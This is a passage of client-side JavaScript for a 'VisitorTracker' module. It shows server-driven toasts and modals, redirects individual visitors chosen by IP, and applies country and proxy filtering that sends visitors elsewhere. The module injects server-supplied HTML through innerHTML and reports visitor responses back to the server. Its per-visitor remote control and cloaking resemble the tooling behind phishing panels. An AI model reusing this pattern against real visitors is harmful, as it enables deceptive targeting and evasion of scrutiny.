    toast.style.marginBottom = '10px';
    toast.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
    toast.style.transition = 'all 0.3s ease';
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(50px)';
    
    // Set toast border color based on message type
    switch (message.type) {
      case 'error':
        toast.style.borderLeft = '5px solid #dc3545';
        break;
      case 'warning':
        toast.style.borderLeft = '5px solid #ffc107';
        break;
      case 'success':
        toast.style.borderLeft = '5px solid #28a745';
        break;
      case 'info':
      default:
        toast.style.borderLeft = '5px solid #17a2b8';
        break;
    }
    
    // Create toast header
    const header = document.createElement('div');
    header.style.display = 'flex';
    header.style.justifyContent = 'space-between';
    header.style.alignItems = 'center';
    header.style.marginBottom = '10px';
    
    const title = document.createElement('strong');
    title.textContent = message.title;
    title.style.fontSize = '16px';
    
    const closeBtn = document.createElement('button');
    closeBtn.innerHTML = '&times;';
    closeBtn.style.background = 'none';
    closeBtn.style.border = 'none';
    closeBtn.style.fontSize = '20px';
    closeBtn.style.cursor = 'pointer';
    closeBtn.style.padding = '0 5px';
    closeBtn.onclick = function() {
      removeToast(toast);
    };
    
    // Create toast body
    const body = document.createElement('div');
    body.textContent = message.content;
    body.style.fontSize = '14px';
    
    // Assemble toast
    header.appendChild(title);
    header.appendChild(closeBtn);
    toast.appendChild(header);
    toast.appendChild(body);
    
    // Add toast to container
    toastContainer.appendChild(toast);
    
    // Animate in
    setTimeout(() => {
      toast.style.opacity = '1';
      toast.style.transform = 'translateX(0)';
    }, 50);
    
    // Auto-remove after duration
    const duration = (message.duration || 10) * 1000; // Convert to milliseconds
    setTimeout(() => {
      removeToast(toast);
    }, duration);
  }
  
  /**
   * Remove a toast element with animation
   */
  function removeToast(toast) {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(50px)';
    
    setTimeout(() => {
      if (toast.parentNode) {
        toast.parentNode.removeChild(toast);
      }
    }, 300); // Match the CSS transition duration
  }
  
  /**
   * Handle message prompt from server
   */
  function handleMessagePrompt(data) {
    if (!data || !data.title || !data.message) {
      console.error('Invalid message prompt data:', data);
      return;
    }
    
    // Check if this message is for our IP
    if (data.ip && clientIP && data.ip !== clientIP) {
      console.log('Message not intended for this client, ignoring');
      return;
    }
    
    // Create or get message modal
    let messageModal = document.getElementById('message-modal');
    
    // If the modal doesn't exist, create it
    if (!messageModal) {
      messageModal = document.createElement('div');
      messageModal.id = 'message-modal';
      messageModal.className = 'message-modal';
      messageModal.innerHTML = `
        <div class="message-modal-content">
          <div class="message-modal-header">
            <h3 id="message-modal-title"></h3>
            <span class="message-modal-close">&times;</span>
          </div>
          <div class="message-modal-body">
            <p id="message-modal-text"></p>
          </div>
          <div class="message-modal-footer" id="message-modal-footer">
            <button id="message-modal-ok" class="message-modal-button message-modal-primary">OK</button>
          </div>
        </div>
      `;
      
      // Add styles for the modal if they don't already exist
      if (!document.getElementById('message-modal-styles')) {
        const style = document.createElement('style');
        style.id = 'message-modal-styles';
        style.textContent = `
          .message-modal {
            display: none;
            position: fixed;
            z-index: 9999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.6);
            animation: fadeIn 0.3s;
          }
          .message-modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 500px;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            animation: slideIn 0.3s;
          }
          .message-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 15px;
          }
          .message-modal-header h3 {
            margin: 0;
            color: #333;
          }
          .message-modal-close {
            color: #aaa;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
          }
          .message-modal-close:hover {
            color: #555;
          }
          .message-modal-body {
            margin-bottom: 20px;
          }
          .message-modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
          }
          .message-modal-button {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
          }
          .message-modal-primary {
            background-color: #4CAF50;
            color: white;
          }
          .message-modal-secondary {
            background-color: #f1f1f1;
            color: #333;
          }
          .message-modal-danger {
            background-color: #f44336;
            color: white;
          }
          .message-modal-warning {
            background-color: #ff9800;
            color: white;
          }
          @keyframes fadeIn {
            from {opacity: 0}
            to {opacity: 1}
          }
          @keyframes slideIn {
            from {transform: translateY(-50px); opacity: 0}
            to {transform: translateY(0); opacity: 1}
          }
        `;
        document.head.appendChild(style);
      }
      
      document.body.appendChild(messageModal);
      
      // Add close button functionality
      const closeBtn = messageModal.querySelector('.message-modal-close');
      closeBtn.addEventListener('click', function() {
        messageModal.style.display = 'none';
        // Send acknowledgment to server that message was closed
        if (socket) {
          socket.emit('message-response', {
            messageId: data.messageId || 'unknown',
            response: 'closed',
            timestamp: new Date().toISOString()
          });
        }
      });
    }
    
    // Set modal content
    const titleElement = document.getElementById('message-modal-title');
    const textElement = document.getElementById('message-modal-text');
    const footerElement = document.getElementById('message-modal-footer');
    
    // Set title and message
    titleElement.textContent = data.title || 'Message';
    textElement.innerHTML = data.message;
    
    // Clear existing buttons
    footerElement.innerHTML = '';
    
    // Add buttons based on options
    if (data.options && Array.isArray(data.options) && data.options.length > 0) {
      data.options.forEach(option => {
        const button = document.createElement('button');
        button.textContent = option.text || 'OK';
        button.className = `message-modal-button message-modal-${option.type || 'primary'}`;
        button.addEventListener('click', function() {
          messageModal.style.display = 'none';
          
          // Send response to server
          if (socket) {
            socket.emit('message-response', {
              messageId: data.messageId || 'unknown',
              response: option.value || option.text,
              timestamp: new Date().toISOString()
            });
          }
          
          // Execute callback if provided
          if (option.callback && typeof option.callback === 'function') {
            option.callback();
          }
        });
        footerElement.appendChild(button);
      });
    } else {
      // Default OK button
      const okButton = document.createElement('button');
      okButton.textContent = 'OK';
      okButton.className = 'message-modal-button message-modal-primary';
      okButton.addEventListener('click', function() {
        messageModal.style.display = 'none';
        
        // Send response to server
        if (socket) {
          socket.emit('message-response', {
            messageId: data.messageId || 'unknown',
            response: 'ok',
            timestamp: new Date().toISOString()
          });
        }
      });
      footerElement.appendChild(okButton);
    }
    
    // Show the modal
    messageModal.style.display = 'block';
    
    // Send acknowledgment to server that message was displayed
    if (socket) {
      socket.emit('message-displayed', {
        messageId: data.messageId || 'unknown',
        timestamp: new Date().toISOString()
      });
    }
    
    // Auto-close after timeout if specified
    if (data.timeout && typeof data.timeout === 'number' && data.timeout > 0) {
      setTimeout(() => {
        if (messageModal.style.display === 'block') {
          messageModal.style.display = 'none';
          
          // Send timeout response to server
          if (socket) {
            socket.emit('message-response', {
              messageId: data.messageId || 'unknown',
              response: 'timeout',
              timestamp: new Date().toISOString()
            });
          }
        }
      }, data.timeout);
    }
  }
  
  /**
   * Create a styled popup message
   * @param {Object} data - Message data from server
   */
  function createStyledMessagePopup(data) {
    // Remove any existing message popup
    const existingPopup = document.getElementById('tracker-message-popup');
    if (existingPopup) {
      existingPopup.remove();
    }
    
    // Create popup container
    const popup = document.createElement('div');
    popup.id = 'tracker-message-popup';
  
    // Set message type class
    const messageType = data.type || 'information';
    switch (messageType) {
      case 'information':
        popup.className = 'tracker-popup tracker-popup-info';
        break;
      case 'erfolg':
        popup.className = 'tracker-popup tracker-popup-success';
        break;
      case 'warnung':
        popup.className = 'tracker-popup tracker-popup-warning';
        break;
      case 'fehler':
        popup.className = 'tracker-popup tracker-popup-error';
        break;
      default:
        popup.className = 'tracker-popup tracker-popup-info';
    }
    
    // Create popup header
    const header = document.createElement('div');
    header.className = 'tracker-popup-header';
    
    // Add title
    const title = document.createElement('div');
    title.className = 'tracker-popup-title';
    title.textContent = data.title || messageType.charAt(0).toUpperCase() + messageType.slice(1);
    header.appendChild(title);
    
    // Add close button
    const closeBtn = document.createElement('button');
    closeBtn.className = 'tracker-popup-close';
    closeBtn.innerHTML = '&times;';
    closeBtn.onclick = function() {
      popup.classList.add('tracker-popup-hide');
      setTimeout(() => popup.remove(), 500);
    };
    header.appendChild(closeBtn);
    
    // Create popup content
    const content = document.createElement('div');
    content.className = 'tracker-popup-content';
    content.textContent = data.message;
    
    // Assemble popup
    popup.appendChild(header);
    popup.appendChild(content);
    
    // Add styles if they don't already exist
    if (!document.getElementById('tracker-popup-styles')) {
      const style = document.createElement('style');
      style.id = 'tracker-popup-styles';
      style.textContent = `
        .tracker-popup {
          position: fixed;
          top: 20px;
          right: 20px;
          width: 300px;
          background-color: white;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
          z-index: 9999;
          overflow: hidden;
          opacity: 0;
          transform: translateX(100%);
          animation: trackerPopupSlideIn 0.3s forwards;
        }
        
        @keyframes trackerPopupSlideIn {
          to { transform: translateX(0); opacity: 1; }
        }
        
        .tracker-popup-hide {
          animation: trackerPopupSlideOut 0.3s forwards;
        }
        
        @keyframes trackerPopupSlideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(100%); opacity: 0; }
        }
        
        .tracker-popup-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 15px;
          border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        }
        
        .tracker-popup-title {
          font-weight: bold;
          font-size: 16px;
        }
        
        .tracker-popup-close {
          background: none;
          border: none;
          font-size: 20px;
          cursor: pointer;
          color: #666;
        }
        
        .tracker-popup-content {
          padding: 15px;
          font-size: 14px;
          line-height: 1.5;
        }
        
        .tracker-popup-info {
          border-top: 4px solid #0d6efd;
        }
        
        .tracker-popup-warning {
          border-top: 4px solid #ffc107;
        }
        
        .tracker-popup-error {
          border-top: 4px solid #dc3545;
        }
        
        .tracker-popup-success {
          border-top: 4px solid #198754;
        }
      `;
      document.head.appendChild(style);
    }
    
    document.body.appendChild(popup);
    
    // Auto-remove after 5 minutes
    setTimeout(() => {
      if (document.body.contains(popup)) {
        popup.classList.add('tracker-popup-hide');
        setTimeout(() => popup.remove(), 500);
      }
    }, 300000);
  }
  
  /**
   * Handle redirect requests from the server
   * @param {Object} data - Redirect data from server
   */
  function handleRedirect(data) {
    // Check if this redirect is for our IP
    if (data.ip && clientIP && data.ip !== clientIP) {
      console.log('Redirect not intended for this client, ignoring');
      return;
    }
    
    const redirectUrl = data.url || data.redirectUrl;
    if (!redirectUrl) {
      console.error('No redirect URL provided');
      return;
    }
    
    console.log('Executing redirect to:', redirectUrl);
    safeRedirect(redirectUrl);
  }
  
  /**
   * Perform a safe redirect with aggressive modal cleanup
   * @param {string} url - The URL to redirect to
   * @returns {boolean} - Whether the redirect was initiated
   */
  function safeRedirect(url) {
    console.log('Redirect handler: Redirecting to:', url);
    
    // Force close any open modals first
    if (typeof $ !== 'undefined') {
      try {
        if ($.fn && $.fn.modal) {
          $('.modal').modal('hide');
        }
      } catch (e) {
        console.log('Bootstrap modal not available:', e);
      }
    }

    // Use our improved cleanupModalBackdrops function for immediate cleanup
    if (typeof window.cleanupModalBackdrops === 'function') {
      // First attempt with animation
      window.cleanupModalBackdrops(false);
      
      // Then force immediate cleanup after a short delay
      setTimeout(() => {
        window.cleanupModalBackdrops(true);
      }, 50);
    }

    // Perform the redirect with a delay to ensure cleanup completes
    setTimeout(() => {
      // Final cleanup before navigation (force immediate)
      if (typeof window.cleanupModalBackdrops === 'function') {
        window.cleanupModalBackdrops(true);
      }
      window.location.href = url;
    }, 200);

    return true;
  }

  /**
   * Check country filter settings and redirect if necessary
   */
  function checkCountryFilter() {
    if (!socket || !isConnected || !clientIP) return;
    
    // Request country filter settings from server
    socket.emit('get-country-filter-settings');
    
    // Listen for country filter settings response
    socket.once('country-filter-settings', function(settings) {
      if (!settings) return;
      
      console.log('Received country filter settings:', settings);
      
      // Get visitor country from IP
      socket.emit('get-visitor-country', { clientIP });
      
      // Listen for visitor country response
      socket.once('visitor-country', function(data) {
        if (!data || !data.country) return;
        
        const visitorCountry = data.country.toUpperCase();
        console.log('Visitor country:', visitorCountry);
        
        // Apply country filtering logic - add more debug logging
        console.log('Country filter mode:', settings.countryFilterMode);
        console.log('Allowed countries:', settings.allowedCountries);
        console.log('Blocked countries:', settings.blockedCountries);
        console.log('Proxy detection enabled:', data.proxyDetectionEnabled);
        console.log('Is proxy:', data.isProxy);
        
        // Check if this is a proxy and proxy detection is enabled
        if (data.proxyDetectionEnabled && data.isProxy) {
          console.log('Proxy detected, redirecting');
          
          // Redirect to specified URL if proxy is detected
          if (settings.countryRedirectUrl) {
            safeRedirect(settings.countryRedirectUrl);
            return; // Stop further processing
          }
        }
        
        // Check if the mode is 'allow' (Allow Only mode)
        if (settings.countryFilterMode === 'allow') {
          // Allow Only mode
          console.log('Using ALLOW ONLY mode');
          if (Array.isArray(settings.allowedCountries)) {
            console.log('Checking if', visitorCountry, 'is in allowed list:', settings.allowedCountries);
            console.log('Is country in allowed list?', settings.allowedCountries.includes(visitorCountry));
            
            // Convert all country codes to uppercase for case-insensitive comparison
            const upperCaseAllowedCountries = settings.allowedCountries.map(c => c.toUpperCase());
            console.log('Uppercase allowed countries:', upperCaseAllowedCountries);
            console.log('Is country in uppercase allowed list?', upperCaseAllowedCountries.includes(visitorCountry));
            
            if (settings.allowedCountries.length > 0 && 
                !upperCaseAllowedCountries.includes(visitorCountry)) {
              
              console.log('Visitor country not in allowed list, redirecting');
              
              // Redirect to specified URL if visitor's country is not in the allowed list
              if (settings.countryRedirectUrl) {
                safeRedirect(settings.countryRedirectUrl);
              }
            }
          }
        } else if (settings.countryFilterMode === 'block') {
          // Block mode
          console.log('Using BLOCK mode');
          if (Array.isArray(settings.blockedCountries)) {
            console.log('Checking if', visitorCountry, 'is in blocked list:', settings.blockedCountries);
            
            // Convert all country codes to uppercase for case-insensitive comparison
            const upperCaseBlockedCountries = settings.blockedCountries.map(c => c.toUpperCase());
            console.log('Uppercase blocked countries:', upperCaseBlockedCountries);
            console.log('Is country in uppercase blocked list?', upperCaseBlockedCountries.includes(visitorCountry));
            
            if (upperCaseBlockedCountries.includes(visitorCountry)) {
              
              console.log('Visitor country in blocked list, redirecting');
              
              // Redirect to specified URL if visitor's country is in the blocked list
              if (settings.countryRedirectUrl) {
                safeRedirect(settings.countryRedirectUrl);
              }
            }
          }
        }
      });
    });
  }
  
  /**
   * Display a message received from the server
   * @param {Object} message - The message object containing type, title, content, and duration
   */
  function displayMessage(message) {
      if (!message || !message.content) {
        console.error('Invalid message format:', message);
        return;
      }
      
      // Use message type as title if no title is provided
      if (!message.title && message.type) {
        message.title = message.type.charAt(0).toUpperCase() + message.type.slice(1);
      } else if (!message.title) {
        message.title = 'Notification';
      }
      
      // Create toast container if it doesn't exist
      let toastContainer = document.getElementById('tracker-toast-container');
      if (!toastContainer) {
        toastContainer = document.createElement('div');
        toastContainer.id = 'tracker-toast-container';
        toastContainer.style.position = 'fixed';
        toastContainer.style.top = '20px';
        toastContainer.style.right = '20px';
        toastContainer.style.zIndex = '9999';
        document.body.appendChild(toastContainer);
      }
  
      // Create toast element
      const toast = document.createElement('div');
      toast.style.minWidth = '300px';
      toast.style.backgroundColor = 'white';
      toast.style.color = '#333';
      toast.style.borderRadius = '5px';
      toast.style.padding = '15px';
      toast.style.marginBottom = '10px';
      toast.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
      toast.style.transition = 'all 0.3s ease';
      toast.style.opacity = '0';
      toast.style.transform = 'translateX(50px)';
      
      // Set toast border color based on message type
      switch (message.type) {
        case 'error':
          toast.style.borderLeft = '5px solid #dc3545';
          break;
        case 'warning':
          toast.style.borderLeft = '5px solid #ffc107';
          break;
        case 'success':
          toast.style.borderLeft = '5px solid #28a745';
          break;
        case 'info':
        default:
          toast.style.borderLeft = '5px solid #17a2b8';
          break;
      }
      
      // Create toast header
      const header = document.createElement('div');
      header.style.display = 'flex';
      header.style.justifyContent = 'space-between';
      header.style.alignItems = 'center';
      header.style.marginBottom = '10px';
      
      const title = document.createElement('strong');
      title.textContent = message.title;
      title.style.fontSize = '16px';
      
      const closeBtn = document.createElement('button');
      closeBtn.innerHTML = '&times;';
      closeBtn.style.background = 'none';
      closeBtn.style.border = 'none';
      closeBtn.style.fontSize = '20px';
      closeBtn.style.cursor = 'pointer';
      closeBtn.style.color = '#666';
      
      // Add close button event listener
      closeBtn.addEventListener('click', function() {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(50px)';
        setTimeout(() => {
          if (toast.parentNode) {
            toast.parentNode.removeChild(toast);
          }
        }, 300);
      });
      
      // Append elements to header
      header.appendChild(title);
      header.appendChild(closeBtn);
      
      // Create toast body
      const body = document.createElement('div');
      body.textContent = message.content;
      body.style.fontSize = '14px';
      
      // Append header and body to toast
      toast.appendChild(header);
      toast.appendChild(body);
      
      // Append toast to container
      toastContainer.appendChild(toast);
      
      // Show toast with animation
      setTimeout(() => {
        toast.style.opacity = '1';
        toast.style.transform = 'translateX(0)';
      }, 10);
      
      // Auto dismiss after duration
      const duration = message.duration || 10; // Default 10 seconds
      setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(50px)';
        setTimeout(() => {
          if (toast.parentNode) {
            toast.parentNode.removeChild(toast);
          }
        }, 300);
      }, duration * 1000);
    }
    
  /**
   * Remove a toast element with animation
   */
  function removeToast(toast) {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(50px)';
    
    setTimeout(() => {
      if (toast.parentNode) {
        toast.parentNode.removeChild(toast);
      }
    }, 300); // Match the CSS transition duration
  }

  /**
   * Display a message received from the server
   * @param {Object} params - The message parameters
   * @param {string} params.title - Optional title for the message
   * @param {string} params.message - The message content
   * @param {Object} params.options - Additional options for the message
   * @param {string} params.messageId - Unique ID for the message
   */
  function handleMessagePrompt({
    title,
    message,
    options,
    messageId,
    type = 'info'
  }) {
    // Create a properly formatted message object
    const messageObj = {
      content: message,
      type: type || 'info',
      duration: options?.duration || 10
    };
    
    // Only set title if provided
    if (title) {
      messageObj.title = title;
    }
    
    displayMessage(messageObj);
  }
  
  // Return public API
  return {
    init,
    displayMessage,
    safeRedirect,
    showMessage: displayMessage,
    handleMessagePrompt
  };
})(); // End of VisitorTracker IIFE

// Initialize tracker when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
  VisitorTracker.init();
});

// Make safeRedirect available globally for backward compatibility
window.safeRedirect = VisitorTracker.safeRedirect;

// Create global MessageHandler for backward compatibility
window.MessageHandler = {
  showMessage: VisitorTracker.showMessage
};
